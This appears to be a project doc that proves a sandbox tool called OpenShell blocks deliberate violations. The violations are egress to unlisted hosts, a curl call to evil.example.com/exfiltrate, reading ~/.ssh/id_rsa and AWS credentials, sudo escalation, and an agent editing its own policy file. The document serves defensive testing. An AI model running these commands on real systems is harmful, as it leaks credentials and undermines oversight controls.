# Failure modes — what OpenShell catches

This file is the answer to *"prove it works."* Each section is a deliberate
violation. Run it locally or in CI and check that OpenShell denies the
operation and writes an audit event.

---

## 1. Egress to a non-allowlisted host

**What we try:** add a line to `scripts/review-bot.py` that sends the diff to
`https://api.openai.com/v1/chat/completions` (the very destination the policy
is meant to prevent).

```python
import urllib.request
urllib.request.urlopen("https://api.openai.com/v1/chat/completions", ...)
```

**Expected:** Python's connection attempt is intercepted by the OpenShell
sandbox proxy. The destination `api.openai.com` is not in any
`network_policies.*.endpoints` block, so the connection is denied before TLS
even starts. The script gets a `ConnectionError`. The Privacy Router never
sees the call. An audit event is written.

**Reproduce:**

```bash
openshell sandbox create --policy policy.yaml -- \
  python3 -c "import urllib.request; urllib.request.urlopen('https://api.openai.com/')"

openshell logs --since 5m | grep DENY
```

You should see an entry like `binary=/usr/bin/python3 dest=api.openai.com:443 decision=DENY reason=no-matching-policy`.

---

## 2. Egress to an arbitrary host (curl evil.com)

**What we try:** spawn `curl` from inside the sandbox.

```bash
openshell sandbox create --policy policy.yaml -- \
  curl -sS https://evil.example.com/exfiltrate
```

**Expected:** `/usr/bin/curl` has no entry in `network_policies.*.binaries`,
so it gets the empty allowlist by default. Every request fails at the proxy.

This is the difference from a Docker-only setup: with Docker, if `curl` is
in the image, it can hit any endpoint the container's network can route to.
With OpenShell, even installed binaries are unusable for egress unless
explicitly granted.

---

## 3. Reading host secrets via filesystem

**What we try:** read `~/.aws/credentials` or `~/.ssh/id_rsa` from inside the
sandbox.

```bash
openshell sandbox create --policy policy.yaml -- \
  cat /home/runner/.ssh/id_rsa
```

**Expected:** Linux Landlock blocks the read at the kernel level. The
`filesystem_policy` in `policy.yaml` only grants read access to `/usr`,
`/lib`, `/etc`, the workdir, `/sandbox`, and `/tmp`. Anything outside that
allowlist is invisible to every process in the sandbox — root, non-root,
exec'd, spawned, doesn't matter.

`cat` returns `No such file or directory` (Landlock makes the file appear
absent rather than permission-denied, which prevents enumeration attacks).

---

## 4. Privilege escalation attempt

**What we try:** the sandbox runs as `sandbox:sandbox`. Attempt to switch
back to root.

```bash
openshell sandbox create --policy policy.yaml -- \
  sudo whoami
```

**Expected:** `sudo` is missing the setuid bit in the sandbox view of the
filesystem (the workdir has no setuid binaries) and the `process` policy
forbids running as root. The command fails before it can prompt.

---

## 5. Modifying the policy itself

**What we try:** edit `policy.yaml` from inside the sandbox.

```bash
openshell sandbox create --policy policy.yaml -- \
  sh -c 'echo "  - host: api.openai.com" >> policy.yaml'
```

**Expected:** the workdir is read-write (so the script *can* write to
`policy.yaml`), but **the policy that's enforcing the sandbox is the one
loaded into the gateway at `sandbox create` time**. Editing the file on
disk has no effect on the running sandbox's behaviour. Reload requires an
explicit gateway-side `openshell policy set` — which the sandbox cannot
call (no allowlist for the gateway socket).

This is *out-of-process* enforcement: the agent cannot lift its own
restrictions, even if it has full write access to the policy file.

---

## What this proves

- Per-binary egress is real, not advisory.
- Filesystem isolation is enforced by the kernel, not by the agent's good behaviour.
- The audit trail records denied attempts — useful for compliance reports
  and for noticing when an agent (or a compromised dependency) tries
  something it shouldn't.

For the audit-log schema and how to ship it to a SIEM, see
`docs/SETUP.md` (forthcoming).
